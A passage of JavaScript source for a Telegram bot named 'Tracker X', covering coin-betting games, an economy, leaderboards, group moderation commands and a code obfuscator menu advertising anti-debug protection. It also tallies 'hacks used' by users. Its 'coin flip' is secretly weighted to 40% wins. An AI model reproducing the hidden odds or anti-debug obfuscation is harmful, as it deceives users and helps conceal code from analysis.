  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  try {
    const chat = await ctx.telegram.getChat(ctx.chat.id);
    const admins = await ctx.telegram.getChatAdministrators(ctx.chat.id);
    const memberCount = await ctx.telegram.getChatMembersCount(ctx.chat.id);
    
    await safeEditMessage(ctx, formatMessage(`
╔══════════════════════════╗
║  📊 GROUP STATISTICS    ║
╚══════════════════════════╝

<b>📝 Group Info:</b>
• Name: ${chat.title}
• ID: <code>${ctx.chat.id}</code>
• Type: ${chat.type}
• Members: ${memberCount}
• Admins: ${admins.length}

<b>⚙️ Protection Settings:</b>
• Anti-link: ${antilinkGroups.get(ctx.chat.id) ? "✅ ON" : "❌ OFF"}
• Anti-spam: ${antispamGroups.get(ctx.chat.id) ? "✅ ON" : "❌ OFF"}
• Lockdown: ${groupLockdown.get(ctx.chat.id) ? "🔒 ON" : "🔓 OFF"}
• Welcome: ${welcomeMessages.has(ctx.chat.id) ? "✅ SET" : "❌ NOT SET"}
• Goodbye: ${goodbyeMessages.has(ctx.chat.id) ? "✅ SET" : "❌ NOT SET"}
• Rules: ${groupRules.has(ctx.chat.id) ? "✅ SET" : "❌ NOT SET"}
• Sticky: ${groupSticky.has(ctx.chat.id) ? "✅ SET" : "❌ NOT SET"}

<b>📈 Activity:</b>
• Total Warnings: ${Array.from(userWarnings.values()).filter(w => w.chatId === ctx.chat.id).length}
• Slow Mode: ${slowMode.get(ctx.chat.id) ? `${slowMode.get(ctx.chat.id)}s` : "OFF"}
  `), { parse_mode: "HTML" });
  } catch (err) {
    await safeEditMessage(ctx, "❌ Failed to get group stats!");
  }
});

// ========== GAMES ==========
bot.action("dice_game", async (ctx) => {
  const user = initUser(ctx.from.id);
  if (user.coins < GAME_BET) {
    return ctx.answerCbQuery(`❌ Need ${GAME_BET} coin!`, { show_alert: true });
  }
  
  removeCoins(ctx.from.id, GAME_BET, "Dice game");
  const dice = Math.floor(Math.random() * 6) + 1;
  const win = dice === 5 || dice === 6;
  
  if (win) {
    const winnings = GAME_BET * 2;
    addCoins(ctx.from.id, winnings, "Won dice");
    user.gamesWon++;
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${dice} and WON!\n💰 +${winnings} coins!`);
  } else {
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${dice} and LOST!\n💸 -${GAME_BET} coin!`);
    user.gamesLost++;
  }
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

bot.action("slots_game", async (ctx) => {
  const user = initUser(ctx.from.id);
  if (user.coins < GAME_BET) {
    return ctx.answerCbQuery(`❌ Need ${GAME_BET} coin!`, { show_alert: true });
  }
  
  removeCoins(ctx.from.id, GAME_BET, "Slots");
  const slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎"];
  const result = [slots[Math.floor(Math.random() * 6)], slots[Math.floor(Math.random() * 6)], slots[Math.floor(Math.random() * 6)]];
  const isJackpot = result[0] === result[1] && result[1] === result[2];
  const isPair = !isJackpot && (result[0] === result[1] || result[1] === result[2] || result[0] === result[2]);
  
  let winnings = 0;
  let msg = "";
  
  if (isJackpot) {
    winnings = GAME_BET * 10;
    msg = `🎰 JACKPOT! ${result.join(" ")}\n💰 +${winnings} coins!`;
  } else if (isPair) {
    winnings = GAME_BET * 2;
    msg = `🎰 Pair! ${result.join(" ")}\n💰 +${winnings} coins!`;
  } else {
    msg = `🎰 ${result.join(" ")}\n💸 -${GAME_BET} coin!`;
    user.gamesLost++;
  }
  
  if (winnings > 0) {
    addCoins(ctx.from.id, winnings, "Won slots");
    user.gamesWon++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
  await ctx.reply(msg);
});

bot.action("coinflip", async (ctx) => {
  const user = initUser(ctx.from.id);
  if (user.coins < GAME_BET) {
    return ctx.answerCbQuery(`❌ Need ${GAME_BET} coin!`, { show_alert: true });
  }
  
  removeCoins(ctx.from.id, GAME_BET, "Coin flip");
  const flip = Math.random() < 0.4;
  
  if (flip) {
    const winnings = GAME_BET * 2;
    addCoins(ctx.from.id, winnings, "Won coin flip");
    user.gamesWon++;
    await ctx.reply(`🪙 Heads! You WIN!\n💰 +${winnings} coins!`);
  } else {
    await ctx.reply(`🪙 Tails! You LOST!\n💸 -${GAME_BET} coin!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

bot.action("high_risk", async (ctx) => {
  const user = initUser(ctx.from.id);
  const bet = 2;
  if (user.coins < bet) {
    return ctx.answerCbQuery(`❌ Need ${bet} coins!`, { show_alert: true });
  }
  
  removeCoins(ctx.from.id, bet, "High risk");
  const win = Math.random() < 0.2;
  
  if (win) {
    const winnings = bet * 10;
    addCoins(ctx.from.id, winnings, "Won high risk");
    user.gamesWon++;
    await ctx.reply(`🔥 HIGH RISK - YOU WON!\n💰 +${winnings} coins!`);
  } else {
    await ctx.reply(`💀 HIGH RISK - YOU LOST!\n💸 -${bet} coins!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// ========== ECONOMY ==========
bot.action("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (user.lastDaily && now - user.lastDaily < dayInMs) {
    const remaining = dayInMs - (now - user.lastDaily);
    const hours = Math.floor(remaining / 3600000);
    return ctx.answerCbQuery(`⏰ Come back in ${hours} hours!`, { show_alert: true });
  }
  
  let streak = user.dailyStreak || 0;
  if (user.lastDaily && now - user.lastDaily < dayInMs * 2) streak++;
  else streak = 1;
  
  const bonus = Math.min(streak, 10);
  const reward = DAILY_REWARD + bonus;
  addCoins(ctx.from.id, reward, "Daily reward");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await ctx.reply(`🎁 Daily reward: +${reward} coins!\n🔥 Streak: ${streak} days\n💰 Balance: ${user.coins + reward}`);
});

bot.action("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < 3600000) {
    const minutes = Math.ceil((3600000 - (now - lastWork)) / 60000);
    return ctx.answerCbQuery(`⏰ Rest ${minutes} minutes!`, { show_alert: true });
  }
  
  const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🍕 Delivery", "📚 Teacher", "🔧 Mechanic"];
  const job = jobs[Math.floor(Math.random() * jobs.length)];
  const reward = Math.floor(Math.random() * (WORK_MAX - WORK_MIN + 1) + WORK_MIN);
  
  addCoins(userId, reward, `Worked as ${job}`);
  userWorkCooldown.set(userId, now);
  await ctx.reply(`💼 Worked as ${job}! +${reward} coins!\n💰 Balance: ${users.get(userId).coins}`);
});

// ========== DEV TOOLS ACTIONS ==========
bot.action("obfuscate_code", async (ctx) => {
  userStates.set(ctx.from.id, { action: "obfuscate" });
  await safeEditMessage(ctx, formatMessage(`
🔒 <b>CODE OBFUSCATOR</b>

Send your JavaScript code to obfuscate.

<b>Features:</b>
• Variable renaming
• String encoding
• Comment removal
• Anti-debug protection
• Code compression

<i>Send your code now:</i>
  `), { parse_mode: "HTML" });
});

bot.action("minify_code", async (ctx) => {
  userStates.set(ctx.from.id, { action: "minify" });
  await safeEditMessage(ctx, formatMessage(`
🗜️ <b>CODE MINIFIER</b>

Send your JavaScript code to minify.

<i>Removes comments, whitespace, and unnecessary characters.</i>

Send your code now:
  `), { parse_mode: "HTML" });
});

bot.action("validate_code", async (ctx) => {
  userStates.set(ctx.from.id, { action: "validate" });
  await safeEditMessage(ctx, formatMessage(`
✅ <b>CODE VALIDATOR</b>

Send your JavaScript code to validate syntax.

<i>Checks for syntax errors and valid JavaScript structure.</i>

Send your code now:
  `), { parse_mode: "HTML" });
});

bot.action("encrypt", async (ctx) => {
  userStates.set(ctx.from.id, { action: "encrypt" });
  await safeEditMessage(ctx, formatMessage(`
🔐 <b>TEXT ENCRYPTOR</b>

Send text to encrypt (AES-256-CBC).

<i>Example: "My secret message"</i>

Send your text now:
  `), { parse_mode: "HTML" });
});

bot.action("decrypt", async (ctx) => {
  userStates.set(ctx.from.id, { action: "decrypt" });
  await safeEditMessage(ctx, formatMessage(`
🔓 <b>TEXT DECRYPTOR</b>

Send encrypted text to decrypt.

<i>Format: [iv]:[encrypted]</i>

Send your encrypted text now:
  `), { parse_mode: "HTML" });
});

bot.action("base64", async (ctx) => {
  userStates.set(ctx.from.id, { action: "base64" });
  await safeEditMessage(ctx, formatMessage(`
📝 <b>BASE64 ENCODER/DECODER</b>

Send text to encode or use /base64 <text>

<b>Commands:</b>
<code>/base64 encode text</code>
<code>/base64 decode base64string</code>

Send your text now:
  `), { parse_mode: "HTML" });
});

bot.action("hash", async (ctx) => {
  userStates.set(ctx.from.id, { action: "hash" });
  await safeEditMessage(ctx, formatMessage(`
🔢 <b>HASH GENERATOR</b>

Send text to generate hash.

<b>Commands:</b>
<code>/hash md5 text</code>
<code>/hash sha1 text</code>
<code>/hash sha256 text</code>
<code>/hash sha512 text</code>

Send your text now:
  `), { parse_mode: "HTML" });
});

bot.action("timestamp", async (ctx) => {
  const now = Math.floor(Date.now() / 1000);
  await safeEditMessage(ctx, formatMessage(`
⏰ <b>TIMESTAMP</b>

<b>Current Unix Timestamp:</b>
<code>${now}</code>

<b>Current Date/Time:</b>
${new Date().toLocaleString()}

<b>Telegram Format:</b>
<code>${now}</code>
  `), { parse_mode: "HTML" });
});

bot.action("random", async (ctx) => {
  userStates.set(ctx.from.id, { action: "random" });
  await safeEditMessage(ctx, formatMessage(`
🎲 <b>RANDOM NUMBER GENERATOR</b>

Send range: <code>min max</code>

<i>Example: 1 100</i>

Send your range now:
  `), { parse_mode: "HTML" });
});

bot.action("note", async (ctx) => {
  await safeEditMessage(ctx, formatMessage(`
📋 <b>NOTE SYSTEM</b>

<b>Commands:</b>
<code>/note save &lt;note&gt;</code> - Save a note
<code>/note list</code> - View your notes
<code>/note delete &lt;number&gt;</code> - Delete a note

<i>Your notes are private and secure!</i>
  `), { parse_mode: "HTML" });
});

bot.action("reminder", async (ctx) => {
  userStates.set(ctx.from.id, { action: "reminder" });
  await safeEditMessage(ctx, formatMessage(`
⏰ <b>REMINDER SETTER</b>

Send: <code>time message</code>

<b>Time formats:</b>
• <code>10m</code> - 10 minutes
• <code>1h</code> - 1 hour
• <code>2d</code> - 2 days

<i>Example: "30m Call mom"</i>

Send your reminder now:
  `), { parse_mode: "HTML" });
});

bot.action("afk", async (ctx) => {
  userStates.set(ctx.from.id, { action: "afk" });
  await safeEditMessage(ctx, formatMessage(`
💤 <b>AFK MODE</b>

Send your AFK message.

<i>Example: "I'm sleeping, back in 2 hours!"</i>

Send your AFK message now:
  `), { parse_mode: "HTML" });
});

bot.action("whois", async (ctx) => {
  await safeEditMessage(ctx, formatMessage(`
🔍 <b>WHOIS COMMAND</b>

<b>Usage:</b>
<code>/whois @username</code>
Or reply to a user's message with <code>/whois</code>

<i>Get detailed user information!</i>
  `), { parse_mode: "HTML" });
});

bot.action("system_info", async (ctx) => {
  const uptime = Date.now() - botStats.startTime;
  const uptimeDays = Math.floor(uptime / 86400000);
  const uptimeHours = Math.floor((uptime % 86400000) / 3600000);
  const uptimeMinutes = Math.floor((uptime % 3600000) / 60000);
  
  await safeEditMessage(ctx, formatMessage(`
📊 <b>SYSTEM INFORMATION</b>

<b>🤖 Bot Info:</b>
• Version: ${BOT_VERSION}
• Uptime: ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m
• Users: ${botStats.totalUsers}
• Groups: ${botStats.totalGroups}

<b>💻 Server:</b>
• Platform: ${process.platform}
• Node: ${process.version}
• Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)} MB

<b>📈 Stats:</b>
• Commands: ${botStats.totalCommands}
• Messages: ${botStats.totalMessages}
• Hacks: ${botStats.totalHacksUsed}
• Obfuscations: ${botStats.totalObfuscations}
• Coins Given: ${botStats.totalCoinsGiven}
• Referrals: ${botStats.totalReferrals}
  `), { parse_mode: "HTML" });
});

// ========== PROFILE & STATS ==========
bot.action("profile", async (ctx) => {
  const user = initUser(ctx.from.id);
  const winRate = user.gamesPlayed > 0 ? ((user.gamesWon / user.gamesPlayed) * 100).toFixed(1) : 0;
  
  await safeEditMessage(ctx, formatMessage(`
╔══════════════════════════╗
║  👤 USER PROFILE        ║
╚══════════════════════════╝

<b>📝 Basic Info:</b>
• Name: ${ctx.from.first_name}
• Username: @${ctx.from.username || 'None'}
• ID: <code>${ctx.from.id}</code>

<b>💰 Economy:</b>
• Coins: ${user.coins}
• Bank: ${user.bank}
• Total Earned: ${user.totalEarned}
• Total Spent: ${user.totalSpent}

<b>📊 Stats:</b>
• Level: ${user.level}
• XP: ${user.xp}/${user.level * 100}
• Referrals: ${user.referrals}
• Hacks Used: ${user.usedHacks}
• Games: ${user.gamesWon}W / ${user.gamesLost}L
• Win Rate: ${winRate}%

<b>🏆 Badges:</b>
${user.badges.map(b => `• ${b}`).join('\n')}
  `), { parse_mode: "HTML", ...mainMenu() });
});

bot.action("stats", async (ctx) => {
  const user = initUser(ctx.from.id);
  const totalCoins = Array.from(users.values()).reduce((sum, u) => sum + u.coins, 0);
  
  await safeEditMessage(ctx, formatMessage(`
╔══════════════════════════╗
║  📊 BOT STATISTICS      ║
╚══════════════════════════╝

<b>🤖 Bot Stats:</b>
• Version: ${BOT_VERSION}
• Uptime: ${Math.floor((Date.now() - botStats.startTime) / 86400000)} days
• Total Users: ${botStats.totalUsers}
• Total Groups: ${botStats.totalGroups}

<b>💰 Economy:</b>
• Total Coins Given: ${botStats.totalCoinsGiven}
• Total Coins in Circulation: ${totalCoins}
• Total Referrals: ${botStats.totalReferrals}
• Total Hacks Used: ${botStats.totalHacksUsed}
• Total Redeems: ${botStats.totalRedeems}
• Total Obfuscations: ${botStats.totalObfuscations}

<b>👤 Your Stats:</b>
• Level: ${user.level}
• Referrals: ${user.referrals}
• Hacks Used: ${user.usedHacks}
• Games: ${user.gamesWon}W / ${user.gamesLost}L
  `), { parse_mode: "HTML", ...mainMenu() });
});

// ========== REDEEM ==========
bot.action("redeem_menu", async (ctx) => {
  await safeEditMessage(ctx, formatMessage(`
╔══════════════════════════╗
║  🎁 REDEEM CODE        ║
╚══════════════════════════╝

<b>Enter your redeem code:</b>

Type: <code>/redeem YOUR_CODE</code>

━━━━━━━━━━━━━━━━━━━━━━━━━

<i>Get codes from:
• Giveaways
• Events
• Support channel</i>
  `), { parse_mode: "HTML" });
});

// ========== REFERRAL INFO ==========
bot.action("referral_info", async (ctx) => {
  const user = initUser(ctx.from.id);
  const link = getReferralLink(ctx.from.id);
  
  await safeEditMessage(ctx, formatMessage(`
╔══════════════════════════╗
║  🔗 REFERRAL SYSTEM     ║
╚══════════════════════════╝

<b>Your Referral Link:</b>
<code>${link}</code>

<b>📊 Your Stats:</b>
• Referrals: ${user.referrals}
• Coins Earned: ${user.referrals * REFERRAL_REWARD}
• Total Coins: ${user.coins}

<b>🎁 Rewards:</b>
• ${REFERRAL_REWARD} coins per referral
• 🏆 "Recruiter" badge at 10 referrals
• 💎 Bonus 20 coins at 25 referrals
• 👑 "Elite Referrer" at 50 referrals
  `), { parse_mode: "HTML", ...mainMenu() });
});

// ========== LEADERBOARDS ==========
bot.action("leaderboard_menu", async (ctx) => {
  await safeEditMessage(ctx, "🏆 **TRACKER X LEADERBOARDS**\n\nView top users across different categories!", {
    parse_mode: "Markdown",
    ...leaderboardMenu()
  });
});

bot.action("leaderboard_coins", async (ctx) => {
  const topUsers = getLeaderboard('coins', 10);
  let message = "🏆 **💰 RICHEST USERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.coins} coins\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_games", async (ctx) => {
  const topUsers = getLeaderboard('games', 10);
  let message = "🏆 **🎮 TOP GAMERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.gamesWon} wins\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_referrals", async (ctx) => {
  const topUsers = getLeaderboard('referrals', 10);
  let message = "🏆 **👥 TOP REFERRERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.referrals} referrals\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_level", async (ctx) => {
  const topUsers = getLeaderboard('level', 10);
  let message = "🏆 **⭐ TOP LEVELS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - Level ${user.level}\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_hacks", async (ctx) => {
  const topUsers = getLeaderboard('hacks', 10);
  let message = "🏆 **🔧 TOP HACKERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.usedHacks} hacks\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("coin_leaderboard", async (ctx) => {
  const topUsers = getLeaderboard('coins', 10);
  let message = "🏆 **💰 RICHEST USERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.coins} coins\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("game_leaderboard", async (ctx) => {
  const topUsers = getLeaderboard('games', 10);
  let message = "🏆 **🎮 TOP GAMERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.gamesWon} wins\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("game_stats", async (ctx) => {
  const user = initUser(ctx.from.id);
  const winRate = user.gamesPlayed > 0 ? ((user.gamesWon / user.gamesPlayed) * 100).toFixed(1) : 0;
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎮 YOUR GAME STATS     ║
╚══════════════════════════╝

<b>📊 Overall Stats:</b>
• Games Played: ${user.gamesPlayed}
• Games Won: ${user.gamesWon}
• Games Lost: ${user.gamesLost}
• Win Rate: ${winRate}%

<b>💰 Coins:</b>
• Current Balance: ${user.coins}
• Total Earned: ${user.totalEarned}
• Total Spent: ${user.totalSpent}

<b>🏆 Achievements:</b>
${user.gamesWon >= 10 ? "• 🎖️ Novice Gambler" : ""}
${user.gamesWon >= 50 ? "• 🥈 Skilled Player" : ""}
${user.gamesWon >= 100 ? "• 🥇 Pro Gambler" : ""}
${user.gamesWon >= 500 ? "• 👑 Gambling Legend" : ""}
  `), { parse_mode: "HTML" });
});

bot.action("bank_menu", async (ctx) => {
  await ctx.reply("🏦 **BANK SYSTEM**\n\nComing soon!", { parse_mode: "Markdown" });
});

bot.action("transfer_menu", async (ctx) => {
  await ctx.reply("💸 **TRANSFER SYSTEM**\n\nComing soon!", { parse_mode: "Markdown" });
});

// ========== BACK BUTTON ==========
bot.action("main_back", async (ctx) => {
  const user = initUser(ctx.from.id);
  await safeEditMessage(ctx, formatMessage(`
╔══════════════════════════════════╗
║     🔱 TRACKER X v3.0 PRO       ║
║     ⚡ ULTIMATE EDITION         ║
╚══════════════════════════════════╝

💰 <b>Balance:</b> ${user.coins} coins
📊 <b>Level:</b> ${user.level}
👥 <b>Referrals:</b> ${user.referrals}

🎯 <b>Select a module below</b>
  `), { parse_mode: "HTML", ...mainMenu() });
});

// ========== GROUP COMMANDS ==========
bot.command("warn", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return ctx.reply("❌ Admin only!");
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to warn them!");
  
  const userId = reply.from.id;
  const warns = (userWarnings.get(`${ctx.chat.id}_${userId}`) || 0) + 1;
  userWarnings.set(`${ctx.chat.id}_${userId}`, warns);
  botStats.totalWarns++;
  
  await ctx.reply(`⚠️ ${reply.from.first_name} warned! (${warns}/3)`);
  
  if (warns >= 3) {
    await ctx.telegram.banChatMember(ctx.chat.id, userId);
    userWarnings.delete(`${ctx.chat.id}_${userId}`);
    await ctx.reply(`🚫 ${reply.from.first_name} banned for 3 warnings!`);
    botStats.totalBans++;
  }
});

bot.command("kick", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return ctx.reply("❌ Admin only!");
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to kick!");
  
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.telegram.unbanChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`👢 ${reply.from.first_name} kicked!`);
  botStats.totalKicks++;
});

bot.command("ban", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return ctx.reply("❌ Admin only!");
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to ban!");
  
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`🚫 ${reply.from.first_name} banned!`);
  botStats.totalBans++;
});

bot.command("mute", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return ctx.reply("❌ Admin only!");
  
  const args = ctx.message.text.split(" ");
  const minutes = parseInt(args[1]) || 30;
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to mute!");
  
  const untilDate = Math.floor(Date.now() / 1000) + (minutes * 60);
  
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, {
      until_date: untilDate,
      can_send_messages: false,
      can_send_media_messages: false,
      can_send_other_messages: false,
      can_add_web_page_previews: false
    });
    await ctx.reply(`🔇 ${reply.from.first_name} muted for ${minutes} minutes!`);
    botStats.totalMutes++;
  } catch (err) {
    ctx.reply("❌ Failed to mute. Make sure I'm admin!");
  }
});

bot.command("unmute", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return ctx.reply("❌ Admin only!");
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to unmute!");
  
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, reply.from.id, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true
    });
    await ctx.reply(`🔊 ${reply.from.first_name} unmuted!`);
  } catch (err) {
    ctx.reply("❌ Failed to unmute.");
  }
});

bot.command("rules", async (ctx) => {
  const rules = groupRules.get(ctx.chat.id);
  if (!rules) return ctx.reply("📋 No rules set for this group. Ask an admin to set them!");
  await ctx.reply(`📋 **GROUP RULES**\n\n${rules}`, { parse_mode: "Markdown" });
});

bot.command("slowmode", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return ctx.reply("❌ Admin only!");
  
  const args = ctx.message.text.split(" ");
  const seconds = parseInt(args[1]);
  
  if (isNaN(seconds) && args[1] !== "off") {
    return ctx.reply("Usage: /slowmode <seconds> or /slowmode off");
  }
  
  if (args[1] === "off") {
    await ctx.telegram.setChatPermissions(ctx.chat.id, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true
    });
    slowMode.delete(ctx.chat.id);
    await ctx.reply("⏱️ Slow mode DISABLED!");
  } else {
    await ctx.telegram.setChatPermissions(ctx.chat.id, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true
    });
    slowMode.set(ctx.chat.id, seconds);
    await ctx.reply(`⏱️ Slow mode ENABLED! ${seconds} seconds between messages.`);
  }
});

bot.command("giveaway", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return ctx.reply("❌ Admin only!");
  
  const args = ctx.message.text.split(" ");
  const coins = parseInt(args[1]);
  const winners = parseInt(args[2]);
  const hours = parseInt(args[3]);
  
  if (!coins || !winners || !hours) {
    return ctx.reply("Usage: /giveaway <coins> <winners> <hours>\nExample: /giveaway 100 3 24");
  }
  
  const endTime = Date.now() + (hours * 60 * 60 * 1000);
  const giveawayId = Date.now().toString();
  
  const message = await ctx.reply(formatMessage(`
🎉 **GIVEAWAY STARTED!** 🎉

💰 **Prize:** ${coins} coins
👥 **Winners:** ${winners}
⏰ **Ends:** ${hours} hours from now

<b>React with 🎉 to enter!</b>
  `), { parse_mode: "Markdown" });
  
  await ctx.telegram.pinChatMessage(ctx.chat.id, message.message_id);
  
  groupGiveaways.set(giveawayId, {
    messageId: message.message_id,
    chatId: ctx.chat.id,
    coins: coins,
    winners: winners,
    endTime: endTime,
    entries: []
  });
  
  // Set timeout to end giveaway
  setTimeout(async () => {
    const giveaway = groupGiveaways.get(giveawayId);
    if (!giveaway) return;
    
    const entries = giveaway.entries;
    const winnerCount = Math.min(giveaway.winners, entries.length);
    const winners_list = [];
    
    for (let i = 0; i < winnerCount; i++) {
      const randomIndex = Math.floor(Math.random() * entries.length);
      winners_list.push(entries[randomIndex]);
      entries.splice(randomIndex, 1);
    }
    
    let winnersText = "";
    for (const winner of winners_list) {
      winnersText += `[${winner}](tg://user?id=${winner})\n`;
      addCoins(parseInt(winner), giveaway.coins, `Won giveaway`);
    }
    
    await ctx.telegram.sendMessage(ctx.chat.id, formatMessage(`
🎉 **GIVEAWAY ENDED!** 🎉

💰 **Prize:** ${giveaway.coins} coins
👥 **Winners:** ${winners_list.length}

🏆 **Winners:**
${winnersText}

Congratulations! 🎊
    `), { parse_mode: "Markdown" });
    
    groupGiveaways.delete(giveawayId);
  }, hours * 60 * 60 * 1000);
});

bot.command("poll", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) return;
  if (!await isAdmin(ctx, ctx.from.id)) return ctx.reply("❌ Admin only!");
  
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  const parts = text.split(" | ");
  const question = parts[0];
  const options = parts.slice(1);
  
  if (!question || options.length < 2) {
    return ctx.reply("Usage: /poll Question | Option1 | Option2 | ...\nExample: /poll Best language? | Python | JavaScript | Java");
  }
  
  if (options.length > 10) {
    return ctx.reply("Maximum 10 options!");
  }
  
  await ctx.telegram.sendPoll(ctx.chat.id, question, options, {
    is_anonymous: false,
    allows_multiple_answers: false
  });
});

// ========== TEXT MESSAGE HANDLER ==========
bot.on("text", async (ctx) => {
  if (!ctx.message || !ctx.message.text) return;
  if (ctx.message.text.startsWith("/")) return;
  
  botStats.totalMessages++;
  
  const userId = ctx.from.id;
  const user = users.get(userId);
  
  // Check AFK
  if (user?.afk) {
    const afkTime = Math.floor((Date.now() - user.afk.time) / 60000);
    await ctx.reply(`💤 ${ctx.from.first_name} is AFK: ${user.afk.message}\n⏱️ ${afkTime} minutes ago`);
    user.afk = null;
    users.set(userId, user);
  }
  
  // Handle user states for dev tools
  const state = userStates.get(userId);
  if (state) {
    const text = ctx.message.text;
    
    switch (state.action) {
      case "obfuscate":
        const obfResult = obfuscateCode(text);
        if (obfResult.success) {
          user.obfuscationsUsed = (user.obfuscationsUsed || 0) + 1;
          users.set(userId, user);
          botStats.totalObfuscations++;
          await ctx.reply(formatMessage(`
✅ **OBFUSCATION COMPLETE!**

📊 Size: ${obfResult.originalLength} → ${obfResult.obfuscatedLength} chars
📉 Compression: ${obfResult.compression}%
🔧 Variables Renamed: ${obfResult.variablesRenamed}

<code>${obfResult.obfuscated.substring(0, 3500)}</code>
          `), { parse_mode: "Markdown" });
        } else {
          await ctx.reply(`❌ Obfuscation failed: ${obfResult.error}`);
        }
        userStates.delete(userId);
        break;
        
      case "minify":
        const minResult = minifyCode(text);
        if (minResult.success) {
          await ctx.reply(formatMessage(`
✅ **MINIFICATION COMPLETE!**

📊 Size: ${minResult.originalLength} → ${minResult.minifiedLength} chars
📉 Reduction: ${minResult.reduction}%

<code>${minResult.minified.substring(0, 3500)}</code>
          `), { parse_mode: "Markdown" });
        } else {
          await ctx.reply(`❌ Minification failed: ${minResult.error}`);
        }
        userStates.delete(userId);
        break;
        
      case "validate":
        const valResult = validateCode(text);
        if (valResult.valid) {
          await ctx.reply(`✅ Code is valid! No syntax errors found.`);
        } else {
